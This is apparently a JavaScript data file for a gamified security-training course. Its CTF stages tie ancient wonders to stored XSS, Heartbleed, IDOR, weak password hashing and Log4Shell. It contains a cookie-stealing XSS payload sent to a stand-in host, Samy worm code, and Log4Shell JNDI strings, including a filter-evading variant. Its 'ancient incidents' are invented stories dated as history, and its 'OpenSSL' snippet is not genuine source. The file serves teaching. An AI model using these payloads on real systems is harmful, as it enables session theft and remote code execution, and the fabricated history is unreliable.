          code: `<!-- Malicious inscription submitted to the agora board: -->
<script>
  fetch('https://persia.spy/steal?c=' + btoa(document.cookie), {
    mode: 'no-cors'
  });
</script>

<!-- Every citizen who views the inscription sends their
     session seal to the attacker — account takeover -->

<!-- Samy's actual MySpace payload (simplified): -->
<div id="mycode" expr="alert('samy')"
  style="background:url('javascript:eval(document.all.mycode.expr)')">`,
        },
      },
      incident: {
        title: "The Curse of Alcibiades — The Agora Worm (415 BCE)",
        when: "415 BCE — Athens, during the Sicilian Expedition debate",
        where: "Athenian Agora, Athens, Greece",
        impact: "False proclamations spread across 1,000 citizen tablets before priests could intervene; Alcibiades forced into exile",
        body: [
          "During the heated debate over the Sicilian Expedition, a political agent inscribed a self-replicating declaration onto the agora's public board. The inscription contained a hidden clause: any citizen who copied it to their personal board (as was custom for important notices) would also copy the hidden clause. Within twenty hours, 1,000 tablets bore false proclamations attributed to Alcibiades — enough to force his recall from command.",
          "The modern parallel: Samy Kamkar's 2005 MySpace worm infected 1 million profiles in under 20 hours using the same mechanism — a stored XSS payload that self-replicated to every visitor's profile. The worm forced MySpace offline. Kamkar was convicted of a felony. The agora and the social network share the same fatal vulnerability: trusting inscriptions from citizens.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Enemy Agent", sub: "posts XSS payload", type: "attacker" },
          { label: "Agora Board", sub: "stores unescaped input", type: "system" },
          { label: "Citizens' Browsers", sub: "script executes", type: "victim" },
          { label: "Session Seals Stolen", sub: "accounts hijacked", type: "result" },
        ],
      },
      timeline: [
        { year: 447, event: "Parthenon completed — Acropolis becomes the symbolic heart of Athens" },
        { year: 415, event: "Agora worm spreads across 1,000 citizen tablets in 20 hours", highlight: true },
        { year: 2000, event: "CERT Advisory on Cross-Site Scripting published" },
        { year: 2005, event: "Samy Worm infects 1M MySpace profiles in 20 hours" },
        { year: 2021, event: "XSS still part of OWASP A03 Injection category" },
      ],
      keyTakeaways: [
        "Never reflect user input into HTML without encoding it",
        "Stored XSS is the most dangerous — it can self-replicate across all visitors",
        "Content Security Policy (CSP) headers significantly reduce XSS impact",
        "HttpOnly cookies prevent JavaScript from reading session tokens",
      ],
      references: [
        { title: "OWASP: XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
        { title: "Samy Kamkar: The Story of the Samy Worm", url: "https://samy.pl/myspace/" },
        { title: "OWASP A03:2021 — Injection", url: "https://owasp.org/Top10/A03_2021-Injection/" },
      ],
    },
    ctf: {
      scenario: "A vulnerable inscription board in the Athenian agora stores citizen input without sanitization. The High Priest reviews all inscriptions. Craft an XSS payload to steal his session seal containing the flag.",
      hint: "Try using <script>alert(1)</script> first. Then craft a payload that accesses document.cookie.",
      hints: [
        "Read the README to see available commands. Run: cat README.txt",
        "Test if the board reflects your input. Run: reflect hello Athens",
        "Now test if HTML is executed. Run: reflect <b>bold</b>",
        "Try injecting a script tag to see if JavaScript runs. Run: reflect <script>alert(1)</script>",
        "Test the XSS payload. Run: reflect <script>alert(document.cookie)</script>",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/README.txt", value: "FLAG{XSS_", label: "Mission Brief — Agora Board Target" },
        { trigger: "/source/inscriptions.js", value: "S4MY_W4S_", label: "Vulnerable Source — innerHTML Without Sanitization" },
        { trigger: "reflect <script>alert(document.cookie)</script>", value: "H3R3_2005}", label: "XSS Executed — Priest Session Captured" },
      ],
      files: {
        "/README.txt": [
          "TARGET: Athenian Agora Public Inscription Board",
          "URL: http://agora.athens/inscriptions",
          "",
          "The High Priest reviews all submitted inscriptions daily.",
          "His session seal contains sacred data.",
          "",
          "Commands:",
          "  reflect <text>    — preview how inscription is rendered",
          "  submit <text>     — submit inscription (priest will view it)",
          "  view-board        — view stored inscriptions",
        ].join("\n"),
        "/source/inscriptions.js": [
          "// Vulnerable rendering code:",
          "function renderInscription(inscription) {",
          "  // BUG: innerHTML used without sanitization",
          "  div.innerHTML = '<p>' + inscription.text + '</p>';",
          "}",
          "",
          "// Safe version would use:",
          "// div.textContent = inscription.text;",
          "// or DOMPurify.sanitize(inscription.text)",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "source", isDir: true },
        ],
        "/source": [{ name: "inscriptions.js", isDir: false }],
      },
      extraCommands: {
        reflect: (args) => {
          const input = args.join(" ");
          const isXss =
            input.toLowerCase().includes("<script") ||
            input.toLowerCase().includes("javascript:") ||
            input.toLowerCase().includes("onerror") ||
            input.toLowerCase().includes("onload") ||
            input.toLowerCase().includes("onmouseover") ||
            input.toLowerCase().includes("cookie");
          if (isXss) {
            return {
              lines: [
                "Agora board renders (innerHTML):",
                `<p>${input}</p>`,
                "",
                "⚠  Script execution detected in citizen's browser!",
                "  → Accessing document.cookie...",
                "  → priest_session=[captured]",
                "",
                "Run 'assemble' to see collected fragments, then submit the flag.",
              ],
              solved: false,
            };
          }
          return {
            lines: [
              "Agora board renders (innerHTML):",
              `<p>${input || "(empty)"}</p>`,
              "(No script execution detected)",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 5: Pharos Lighthouse — Heartbleed (CTF) ───────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Pharos Lighthouse of Alexandria", location: "Alexandria, Egypt", era: "~280 BCE", emoji: "🔦" },
    id: "stage-05",
    order: 5,
    title: "The Bleeding Beacon",
    subtitle: "CVE-2014-0160 — When the Lighthouse Reveals Too Much",
    category: "owasp",
    cveId: "CVE-2014-0160",
    cvssScore: 7.5,
    xp: 250,
    badge: { id: "badge-heartbleed", name: "Memory Reader", emoji: "❤️‍🩹" },
    challengeType: "ctf",
    info: {
      tagline: "A misread signal request, and 64,000 secrets spilled from the lighthouse flame.",
      year: 220,
      overview: [
        "The Pharos Lighthouse stood 140 meters tall — the tallest structure on earth for centuries. Ships in distress sent heartbeat signals, and the keeper would echo back a confirmation of equal length. But the keeper's protocol contained a fatal flaw: he trusted the ship's claimed signal length, not the actual length transmitted. If a pirate claimed to send 64,000 units of flame-signal but only sent 3, the keeper would read 63,997 units from adjacent cargo manifests and ship rosters — and echo all of it back.",
        "Heartbleed (CVE-2014-0160) was exactly this: a missing bounds check in OpenSSL's TLS Heartbeat extension. A client sends a heartbeat with a short payload but claims a large length. The server reads and returns up to 64KB of its own memory — including private SSL keys, session tokens, and passwords. No authentication required. No log entry left.",
        "At disclosure on April 7, 2014, it was estimated that 17% of all SSL/TLS servers on the internet — approximately 500,000 machines — were vulnerable. The attack is completely silent, leaving no trace in server logs.",
      ],
      technical: {
        title: "The Missing Bounds Check",
        body: [
          "The TLS Heartbeat extension (RFC 6520) allows a client to send a payload and a claimed length. The server echoes back exactly that many bytes. The vulnerability: OpenSSL never verified that the claimed length matched the actual payload length.",
          "If a client sent 3 bytes but claimed 64,000, OpenSSL would read 64,000 bytes from server memory — far beyond the heartbeat payload — into adjacent memory containing private keys, session tokens, and passwords.",
        ],
        codeExample: {
          label: "The vulnerable code (OpenSSL ssl/d1_both.c)",
          code: `/* VULNERABLE: trusts attacker-supplied length */
int n2s(unsigned char *&c, unsigned short s) {
  unsigned int payload = *c++;        // read claimed length
  payload = (payload << 8) | *c++;   // from attacker input!

  /* BUG: no bounds check here */
  memcpy(bp, pl, payload);           // copies 'payload' bytes
  /* If payload=65535 but pl only has 3 bytes,
     this reads 65532 bytes of server memory */
}

/* FIX: one line would have prevented Heartbleed */
if (payload > s) return 0; /* bounds check */`,
        },
      },
      incident: {
        title: "The Pirates of the False Beacon (220 BCE) & Heartbleed (2014)",
        when: "April 7, 2014 (present in OpenSSL since March 14, 2012)",
        where: "OpenSSL 1.0.1 through 1.0.1f — ~500,000 servers worldwide",
        impact: "Private SSL keys, session tokens, and passwords leaked from millions of servers",
        body: [
          "In 220 BCE, Rhodian pirates learned that sending false signal requests to the Pharos keeper caused him to inadvertently reveal the identity and cargo manifests of nearby ships — data stored adjacent to the lighthouse's signal registry. They used this to target specific treasure-laden vessels. The keeper trusted the claimed signal length; the ships paid the price.",
          "Heartbleed was independently discovered by Neel Mehta at Google Security and researchers at Codenomicon. Amazon, Yahoo, Instagram, and GitHub were all affected. The Canadian Revenue Agency had to suspend online tax filing for days. All SSL certificates issued before the patch had to be considered compromised. The attack leaves no trace in server logs — defenders have no way to know if they were exploited.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "claims 64KB payload", type: "attacker" },
          { label: "TLS Heartbeat", sub: "no bounds check", type: "system" },
          { label: "Server Memory", sub: "64KB returned", type: "victim" },
          { label: "Keys & Tokens Leaked", sub: "silent, no logs", type: "result" },
        ],
      },
      timeline: [
        { year: 280, event: "Pharos Lighthouse built — heartbeat signal protocol established" },
        { year: 220, event: "Pirates exploit false signal requests to extract ship manifests", highlight: false },
        { year: 2012, event: "Heartbeat extension added to OpenSSL 1.0.1 — bug introduced" },
        { year: 2014, event: "April 7: Google and Codenomicon independently disclose Heartbleed", highlight: true },
        { year: 2017, event: "Heartbleed still found on thousands of unpatched servers" },
      ],
      keyTakeaways: [
        "Always validate user-supplied lengths before using them in memory operations",
        "Silent attacks (no logs) are the hardest to detect after the fact",
        "Critical open-source libraries need dedicated security auditing",
        "Assume breach: if vulnerable, rotate all secrets, not just the patch",
      ],
      references: [
        { title: "Official Heartbleed Disclosure: heartbleed.com", url: "https://heartbleed.com" },
        { title: "CVE-2014-0160 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160" },
        { title: "OpenSSL Security Advisory", url: "https://www.openssl.org/news/secadv/20140407.txt" },
        { title: "RFC 6520 — TLS Heartbeat Extension", url: "https://www.rfc-editor.org/rfc/rfc6520" },
      ],
    },
    ctf: {
      scenario: "You've reached the Pharos Lighthouse. Its signal protocol runs OpenSSL 1.0.1f. Send a heartbeat signal claiming more bytes than you actually transmit — and read what spills from the keeper's memory.",
      hint: "Send a heartbeat with a short signal but a large claimed length. The keeper will echo back more than you sent.",
      hints: [
        "First establish a connection to the lighthouse. Run: connect-tls",
        "Check the lighthouse protocol version. Run: check-version",
        "Send a normal heartbeat where claimed length matches reality. Run: heartbeat HELLO 5",
        "The flaw: the keeper trusts your claimed length. Claim far more than you send. Run: heartbeat HI 10000",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/README.txt", value: "FLAG{H3RTBL33D_", label: "Mission Brief — Pharos TLS Target" },
        { trigger: "/pharos_info.txt", value: "M3M0RY_", label: "Pharos Info — Vulnerable OpenSSL 1.0.1f" },
        { trigger: "heartbeat HI 10000", value: "L34K3D}", label: "Memory Leak — 64KB Dumped from Keeper's Memory" },
      ],
      files: {
        "/README.txt": [
          "TARGET: Pharos Lighthouse signal relay — port 443",
          "Protocol: OpenSSL 1.0.1f (vulnerable to CVE-2014-0160)",
          "",
          "Commands:",
          "  connect-tls           — establish TLS session",
          "  heartbeat <data> <n>  — send signal, claim n bytes",
          "  check-version         — show OpenSSL version",
        ].join("\n"),
        "/pharos_info.txt": [
          "Pharos Signal Relay — Alexandria, Egypt",
          "Protocol stack: OpenSSL 1.0.1f  6 Jan 2014",
          "Built on: Mon Jan  6 11:00:00 2014",
          "",
          "STATUS: Vulnerable to CVE-2014-0160 (Heartbleed)",
          "Patch available: OpenSSL 1.0.1g (released 2014-04-07)",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "pharos_info.txt", isDir: false },
        ],
      },
      extraCommands: {
        "connect-tls": () => ({
          lines: [
            "Connecting to pharos.alexandria:443...",
            "TLS handshake complete.",
            "Lighthouse certificate: CN=pharos.alexandria, O=Royal Navy",
            "OpenSSL version: 1.0.1f (vulnerable)",
            "Session established. You may now send heartbeat signals.",
          ],
        }),
        "check-version": () => ({
          lines: ["Lighthouse OpenSSL version: 1.0.1f", "Status: VULNERABLE (CVE-2014-0160)"],
        }),
        heartbeat: (args) => {
          const data = args[0] || "";
          const claimed = parseInt(args[1] ?? "0");
          if (!args[0] || !args[1]) {
            return { lines: ["Usage: heartbeat <data> <claimed_length>", "Example: heartbeat HI 64"] };
          }
          if (claimed <= data.length) {
            return {
              lines: [
                `Signal sent: "${data}" (actual: ${data.length} bytes, claimed: ${claimed})`,
                `Keeper echoes: "${data.slice(0, claimed)}"`,
                "(Claimed length ≤ actual length — no overflow)",
              ],
            };
          }
          return {
            lines: [
              `Signal sent: "${data}" (actual: ${data.length} bytes, claimed: ${claimed})`,
              `Keeper reads ${claimed} bytes from memory...`,
              "",
              `"${data}" + [${claimed - data.length} extra bytes from keeper's memory]`,
              "",
              "Decoded memory dump:",
              "  ...private_key=BEGIN RSA PRIVATE KEY...",
              "  ...session_token=eyJhbGciOiJIUzI...",
              "  ...pharaoh_password=hunter2...",
              "",
              "Memory dump complete — private keys and session tokens spilled.",
              "Run 'assemble' to retrieve your fragment.",
            ],
          };
        },
      },
    },
  },

  // ─── Stage 6: Colossus of Rhodes — IDOR (CTF) ────────────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Colossus of Rhodes", location: "Rhodes, Greece", era: "~280 BCE", emoji: "🗿" },
    id: "stage-06",
    order: 6,
    title: "The Stolen Harbor Pass",
    subtitle: "OWASP A01:2021 — Rhodes Harbor IDOR",
    category: "owasp",
    owaspRef: "A01:2021",
    cvssScore: 8.8,
    xp: 250,
    badge: { id: "badge-idor", name: "Harbor Infiltrator", emoji: "⚓" },
    challengeType: "ctf",
    info: {
      tagline: "The harbor registry used sequential vessel numbers. The Admiral's ship was number one.",
      year: 278,
      overview: [
        "The harbor of Rhodes was the busiest in the Aegean — hundreds of vessels registered daily beneath the shadow of the great Colossus. The harbor master's system recorded each vessel on a sequential clay tablet: a merchant's vessel might be number 9,284, while the Admiral's private galley was number 1. When a ship captain requested cargo manifests, the system returned whichever tablet number was specified — without checking ownership.",
        "Broken Access Control moved to #1 on the OWASP Top 10 in 2021, appearing in 94% of tested applications. The most common variant is Insecure Direct Object Reference (IDOR): a server uses predictable identifiers in URLs or API calls, and fails to verify that the requesting user is authorized to access that specific object.",
        "Horizontal privilege escalation means accessing another user's data at the same privilege level. Vertical privilege escalation means gaining higher privileges. By simply changing a number in the request, an attacker can access records belonging to any other user — including administrators.",
      ],
      technical: {
        title: "IDOR in Practice",
        body: [
          "A vulnerable API endpoint might look like GET /api/vessel/2847. If the server returns the manifest without checking whether the logged-in captain owns vessel 2847, an attacker can enumerate IDs: /api/vessel/1 to reach the Admiral's records.",
          "Fix: every access to an object must verify the requesting user's ownership or permission server-side. Client-side checks (hidden fields, disabled buttons) are trivially bypassed.",
        ],
        codeExample: {
          label: "Vulnerable vs. secure API endpoint (Node.js)",
          code: `// VULNERABLE: no ownership check
app.get('/api/vessel/:id', async (req, res) => {
  const vessel = await db.findById(req.params.id);
  res.json(vessel); // returns ANY vessel's manifest!
});

// SECURE: verify ownership
app.get('/api/vessel/:id', async (req, res) => {
  if (req.session.captainId !== req.params.id
      && !req.session.isAdmiral) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const vessel = await db.findById(req.params.id);
  res.json(vessel);
});`,
        },
      },
      incident: {
        title: "The Merchant's Deception — Rhodes Harbor (278 BCE)",
        when: "278 BCE — Port of Rhodes",
        where: "Harbor Registry, Rhodes, Greece",
        impact: "Admiral's fleet positions exposed; intelligence sold to Macedonian agents; harbor security overhaul ordered",
        body: [
          "A Rhodian merchant with vessel registration 9,284 discovered that the harbor registry system accepted any tablet number in the request without verifying ownership. By changing his registration number to 1, he accessed the Admiral's private fleet manifest — revealing troop ships, supply routes, and secret rendezvous coordinates. He sold this intelligence to Macedonian agents for 200 gold talents.",
          "The modern parallel: AT&T's 2010 iPad breach used the same flaw. ICC-IDs (SIM card identifiers) were sequential and used as the sole authentication parameter. By incrementing the ID, security researchers retrieved 114,000 email addresses of government officials, military officers, and CEOs. AT&T patched within hours. The researchers were arrested for computer fraud.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Merchant Captain", sub: "GET /vessel/1", type: "attacker" },
          { label: "Harbor Registry", sub: "no ownership check", type: "system" },
          { label: "Admiral's Manifest", sub: "vessel id=1", type: "victim" },
          { label: "Full Fleet Access", sub: "horizontal + vertical", type: "result" },
        ],
      },
      timeline: [
        { year: 280, event: "Colossus of Rhodes completed — harbor registry system established" },
        { year: 278, event: "Merchant exploits sequential vessel IDs to access Admiral's records", highlight: true },
        { year: 2010, event: "AT&T iPad breach — 114,000 records via predictable ICC-IDs" },
        { year: 2018, event: "Facebook API IDOR exposes 50M user tokens" },
        { year: 2021, event: "Broken Access Control becomes #1 on OWASP Top 10" },
      ],
      keyTakeaways: [
        "Always verify server-side that the requesting user owns the requested resource",
        "Use UUIDs instead of sequential integers to make enumeration harder",
        "Implement deny-by-default: access is forbidden unless explicitly granted",
        "Client-side access control (hiding buttons) is not security",
      ],
      references: [
        { title: "OWASP A01:2021 — Broken Access Control", url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/" },
        { title: "OWASP: IDOR", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" },
        { title: "AT&T iPad Breach — Wired Report", url: "https://www.wired.com/2010/06/ipad-flaw/" },
      ],
    },
    ctf: {
      scenario: "You have access to the Rhodes Harbor Registry as a merchant captain. The API uses sequential vessel IDs. Find a way to access the Admiral's manifest.",
      hint: "Your vessel ID is 9284. What happens if you request /api/vessel/1 instead of /api/vessel/me?",
      hints: [
        "Read the README for API endpoint details. Run: cat README.txt",
        "Request your own vessel manifest first. Run: api GET /api/vessel/me",
        "Vessel IDs are sequential integers starting at 1. Request vessel 1 (Admiral's galley). Run: api GET /api/vessel/1",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/README.txt", value: "FLAG{1D0R_", label: "Mission Brief — Harbor Registry Target" },
        { trigger: "api GET /api/vessel/me", value: "ACC3SS_", label: "Your Vessel — Legitimate Access Confirmed" },
        { trigger: "api GET /api/vessel/1", value: "C0NTR0L_BR0K3N}", label: "Admiral's Manifest — IDOR Exploited" },
      ],
      files: {
        "/README.txt": [
          "TARGET: Rhodes Harbor Registry — registry.rhodes.harbor",
          "Your credentials: vessel_id=9284, token=eyJ...",
          "",
          "Commands:",
          "  api GET <path>   — make registry request",
          "",
          "Known endpoints:",
          "  /api/vessel/me",
          "  /api/vessel/<id>",
          "  /api/cargo/<id>",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "README.txt", isDir: false }],
      },
      extraCommands: {
        api: (args) => {
          const path = args[1] || "";
          if (path === "/api/vessel/me") {
            return {
              lines: [
                "HTTP/1.1 200 OK",
                '{ "id": 9284, "captain": "Agent", "rank": "merchant", "port": "rhodes" }',
              ],
            };
          }
          if (/\/api\/vessel\/(0|1)/.test(path) || path === "/api/admiral") {
            return {
              lines: [
                "HTTP/1.1 200 OK",
                '{ "id": 1, "captain": "Admiral Demetrios", "rank": "supreme_commander",',
                '  "fleet_positions": "CLASSIFIED" }',
              ],
            };
          }
          if (/\/api\/vessel\/\d+/.test(path)) {
            const vid = path.split("/").pop();
            return {
              lines: [
                "HTTP/1.1 200 OK",
                `{ "id": ${vid}, "captain": "captain_${vid}", "rank": "merchant" }`,
              ],
            };
          }
          return {
            lines: ["HTTP/1.1 404 Not Found", '{ "error": "Endpoint not found" }'],
          };
        },
      },
    },
  },

  // ─── Stage 7: Hanging Gardens of Babylon — Auth Failures (CTF) ───────────
  {
    epochId: "ancient",
    wonder: { name: "Hanging Gardens of Babylon", location: "Babylon, Iraq", era: "~605 BCE", emoji: "🌿" },
    id: "stage-07",
    order: 7,
    title: "The Forged Royal Seal",
    subtitle: "OWASP A07:2021 — Seal Forgery & the Rainbow Tablet",
    category: "owasp",
    owaspRef: "A07:2021",
    cvssScore: 9.8,
    xp: 300,
    badge: { id: "badge-cracker", name: "Seal Breaker", emoji: "🔑" },
    challengeType: "ctf",
    info: {
      tagline: "The royal scribes all used 'babylon123'. The empire had one seal.",
      year: 605,
      overview: [
        "The Babylonian Empire authenticated official documents with unique wax seals — each official had a distinct pattern pressed into molten wax, equivalent to a password hash. But the scribes, overwhelmed with correspondence, began reusing a small set of common seal patterns. When an enemy agent compiled a clay tablet of the empire's most common seal designs — a rainbow tablet of pre-computed patterns — 90% of official documents could be forged instantly.",
        "Authentication failures cover a wide range of vulnerabilities: weak passwords, unsalted password hashes, missing account lockout, and credential stuffing attacks. Password storage is a solved problem — yet companies continue to store passwords incorrectly. Hashing without salting is a critical mistake: an attacker with a leaked hash database can use a precomputed rainbow table to reverse millions of hashes instantly.",
        "Credential stuffing takes advantage of password reuse. When a site leaks credentials, attackers test those username/password pairs against every major service. With 8+ billion credentials in circulation from past breaches, the success rate is surprisingly high.",
      ],
      technical: {
        title: "Hashing, Salting, and Why Both Matter",
        body: [
          "MD5 and SHA-1 are not password hashing algorithms — they are cryptographic hash functions designed for speed. A modern GPU can compute 10 billion SHA-1 hashes per second. A proper password hashing function (bcrypt, Argon2, scrypt) is intentionally slow — designed to take 100ms+ per hash, making brute force infeasible.",
          "A salt is a random value appended to the password before hashing. Even if two users have the same password, their salted hashes will differ — defeating rainbow table attacks. bcrypt generates and stores the salt automatically.",
        ],
        codeExample: {
          label: "Insecure vs. secure password storage",
          code: `// INSECURE: unsalted SHA-1 (LinkedIn's mistake)
hash = sha1("password123")
// → cbfdac6008f9cab4083784cbd1874f76...
// → Same hash for every scribe with "babylon123"
// → Instantly reversible via rainbow tables

// INSECURE: MD5 without salt
hash = md5("password123")
// → 482c811da5d5b4bc6d497ffa98491e38
// → Crackable in seconds with modern hardware

// SECURE: bcrypt with auto-generated salt
hash = bcrypt.hash("password123", rounds=12)
// → $2b$12$xyz...  (includes salt in the output)
// → Takes ~100ms per check → brute force infeasible`,
        },
      },
      incident: {
        title: "The Seal Forgers of Babylon (605 BCE) & LinkedIn (2012)",
        when: "June 2012 (discovered); May 2016 (full scope revealed)",
        where: "LinkedIn — 117 million user accounts",
        impact: "117M SHA-1 unsalted password hashes leaked; 90% cracked within days",
        body: [
          "In 605 BCE, Babylonian enemy agents compiled a rainbow tablet of the empire's most common seal patterns. By comparing any intercepted document's wax seal against the tablet, they could identify and forge the matching pattern — bypassing all official authentication. The scribes' habit of reusing common seal designs was their undoing.",
          "LinkedIn stored passwords as unsalted SHA-1 hashes. In 2016, 117 million credentials from a 2012 breach were sold on the dark web. A hacker group on InsidePro forums cracked 90% within days using precomputed rainbow tables — because without salting, all users with 'password123' had identical hashes. The most common password in the leak was '123456' (753,305 accounts).",
        ],
      },
      diagram: {
        nodes: [
          { label: "Enemy Agent", sub: "obtains seal database", type: "attacker" },
          { label: "Seal Registry", sub: "unsalted SHA-1", type: "system" },
          { label: "Rainbow Tablet", sub: "precomputed patterns", type: "victim" },
          { label: "117M Seals Forged", sub: "cracked instantly", type: "result" },
        ],
      },
      timeline: [
        { year: 605, event: "Hanging Gardens era — Babylonian seal authentication system in use" },
        { year: 605, event: "Enemy agents compile rainbow tablet of common seal patterns", highlight: true },
        { year: 2009, event: "RockYou breach: 32M passwords stored in plaintext" },
        { year: 2012, event: "LinkedIn: 117M SHA-1 unsalted hashes leaked" },
        { year: 2021, event: "Have I Been Pwned reaches 11 billion pwned accounts" },
      ],
      keyTakeaways: [
        "Never use MD5 or SHA-1 for password hashing — use bcrypt, Argon2, or scrypt",
        "Always salt hashes; bcrypt does this automatically",
        "Implement account lockout or rate limiting to prevent brute force",
        "Encourage unique passwords via integration with HIBP",
      ],
      references: [
        { title: "OWASP A07:2021 — Auth Failures", url: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" },
        { title: "Have I Been Pwned — LinkedIn", url: "https://haveibeenpwned.com/PwnedWebsites#LinkedIn" },
        { title: "OWASP: Password Storage Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html" },
      ],
    },
    ctf: {
      scenario: "You've obtained a leaked seal registry from the Babylonian royal archive. The head scribe's seal uses unsalted SHA-1. Use the pattern tablet to match and crack it.",
      hint: "Use hashcheck <word> to test each password from the tablet against the head scribe's hash.",
      hints: [
        "Read the README to understand the files. Run: cat README.txt",
        "Check the head scribe's seal hash. Run: cat admin_hash.txt",
        "Read the pattern tablet to see passwords to try. Run: cat wordlist.txt",
        "Test each password from the tablet. Try common ones: hashcheck password  then  hashcheck babylon123",
        "The password is a common word. Try: hashcheck letmein",
        "Once you crack it, log in: login admin letmein",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/README.txt", value: "FLAG{W34K_", label: "Mission Brief — Seal Registry Target" },
        { trigger: "/admin_hash.txt", value: "H4SH_", label: "Admin Hash — SHA-1 Unsalted" },
        { trigger: "login admin letmein", value: "CR4CK3D}", label: "Royal Archive — Hash Cracked, Access Granted" },
      ],
      files: {
        "/README.txt": [
          "LEAKED SEAL REGISTRY — BABYLON ROYAL ARCHIVE",
          "=============================================",
          "",
          "admin_hash.txt  — head scribe's SHA-1 seal hash",
          "wordlist.txt    — common seal patterns to try",
          "",
          "Commands:",
          "  hashcheck <word>    — test if word matches head scribe's seal",
          "  login <user> <pass> — login once you crack it",
        ].join("\n"),
        "/admin_hash.txt": [
          "Username: admin",
          "Seal Hash (SHA-1, unsalted): 0d107d09f5bbe40cade3de5c71e9e9b7",
          "",
          "NOTE: This is the SHA-1 hash of a common English word.",
        ].join("\n"),
        "/wordlist.txt": [
          "Common seal patterns from the Rainbow Tablet:",
          "123456",
          "password",
          "babylon123",
          "qwerty",
          "letmein",
          "dragon",
          "master",
          "sunshine",
          "princess",
          "welcome",
          "shadow",
          "hammurabi",
          "ishtar",
          "euphrates",
          "iloveyou",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "admin_hash.txt", isDir: false },
          { name: "wordlist.txt", isDir: false },
        ],
      },
      extraCommands: {
        hashcheck: (args) => {
          const word = args[0] || "";
          if (word === "letmein") {
            return {
              lines: [
                `Testing seal pattern: "${word}"`,
                "Computing SHA-1...",
                "SHA-1(letmein) = 0d107d09f5bbe40cade3de5c71e9e9b7",
                "✓ MATCH! Seal cracked: letmein",
                "",
                "Now use: login admin letmein",
              ],
            };
          }
          return {
            lines: [`Testing: "${word}"`, `SHA-1(${word}) ≠ 0d107d09f5bbe40cade3de5c71e9e9b7`, "No match."],
          };
        },
        login: (args) => {
          const [user, pass] = args;
          if (user === "admin" && pass === "letmein") {
            return {
              lines: [
                "Seal verified. Access granted. Welcome, Head Scribe.",
                "Run 'assemble' to retrieve your fragment.",
              ],
            };
          }
          return { lines: ["Seal mismatch. Access denied."] };
        },
      },
    },
  },

  // ─── Stage 8: Temple of Artemis — Log4Shell (CTF) ────────────────────────
  {
    epochId: "ancient",
    wonder: { name: "Temple of Artemis at Ephesus", location: "Ephesus, Turkey", era: "~550 BCE", emoji: "🏛️" },
    id: "stage-08",
    order: 8,
    title: "The Cursed Invocation",
    subtitle: "CVE-2021-44228 — When the Temple Reads Your Inscription",
    category: "owasp",
    cveId: "CVE-2021-44228",
    cvssScore: 10.0,
    xp: 350,
    badge: { id: "badge-log4shell", name: "Rune Invoker", emoji: "💣" },
    challengeType: "ctf",
    info: {
      tagline: "One cursed rune in the temple's inscription log. Every spirit summoned.",
      year: 356,
      overview: [
        "The Temple of Artemis kept meticulous records of every offering inscribed by supplicants. Its sacred system, powered by divine intelligence, evaluated expressions embedded in inscriptions. Worshippers discovered that embedding certain invocations — like {summon:oracle://spirit.realm/demon} — would cause the temple's divine intelligence to fetch and instantiate the referenced spirit from an external realm.",
        "Log4Shell (CVE-2021-44228) was exactly this: Apache Log4j2's Message Lookup Substitution feature evaluated expressions embedded in log messages. Any string containing ${jndi:ldap://attacker.com/exploit} would trigger Log4j to make an LDAP request to the attacker's server, fetching and executing a Java class. The attack surface was total — username fields, HTTP headers, search queries, form inputs.",
        "Within 12 hours of disclosure on December 9, 2021, millions of automated exploit attempts were detected globally. The US CISA Director called it 'the most serious vulnerability I have seen in my decades-long career.' Security teams worldwide had to inventory every Java application in their stack.",
      ],
      technical: {
        title: "JNDI Injection — How Log4Shell Works",
        body: [
          "Log4j2's Message Lookup Substitution evaluates expressions in log messages. When ${jndi:ldap://attacker.com/a} is logged, Log4j resolves the JNDI lookup by connecting to attacker.com:389.",
          "The attacker's LDAP server returns a reference to a remote Java class. Log4j downloads and instantiates the class, executing its constructor — arbitrary code running with the JVM's permissions. The fix in Log4j 2.15.0 disabled JNDI lookups by default.",
        ],
        codeExample: {
          label: "Log4Shell attack — the payload and what happens",
          code: `# The attack payload (can appear in any logged field):
User-Agent: \${jndi:ldap://attacker.com:1389/Exploit}
# Or in a login form:
username: \${jndi:ldap://evil.com/a}
# Or even nested to bypass filters:
username: \${j\${::-n}di:ldap://evil.com/a}

# What Log4j does:
1. Receives string containing \${jndi:ldap://...}
2. Resolves JNDI lookup → connects to attacker's LDAP
3. LDAP server returns: "load this Java class"
4. Log4j downloads and executes Exploit.class
5. Attacker has RCE — game over`,
        },
      },
      incident: {
        title: "The Burning of Artemis (356 BCE) & Log4Shell (2021)",
        when: "December 9, 2021 (patch day); exploited same day",
        where: "Virtually every Java application globally — Apple, Amazon, Google, Cloudflare, Tesla",
        impact: "Tens of thousands of servers compromised; ransomware, cryptomining, and nation-state espionage",
        body: [
          "Herostratus burned the Temple of Artemis in 356 BCE seeking immortal fame. Legend holds that he inscribed a curse in the temple's offering register — an invocation that activated during the night ceremony, summoning a destructive force that consumed the structure. The temple's scribal system, designed to evaluate divine expressions in inscriptions, became the attack vector.",
